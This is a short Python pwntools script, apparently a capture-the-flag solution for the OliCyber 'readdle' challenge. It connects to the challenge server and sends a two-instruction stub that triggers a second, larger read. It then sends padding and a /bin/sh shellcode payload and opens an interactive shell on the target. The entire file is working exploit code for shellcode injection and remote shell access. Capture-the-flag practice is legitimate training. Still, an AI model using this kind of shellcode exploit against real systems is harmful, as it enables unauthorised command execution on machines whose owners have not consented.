from pwn import *

HOST = "readdle.challs.olicyber.it"
PORT = 10018

exe = context.binary = ELF("olicyber/rev/bin/readdle")

heap_index = 0x1337000
read_addr = 0x40092D

code = """
    mov dh, 0x10
    syscall
"""

s = remote(HOST, PORT)

data = s.recvuntil(b"bytes):")
print(data)

payload = asm(code)
payload += b"A" * 4
payload += asm(shellcraft.sh())

s.send(payload)

s.interactive()
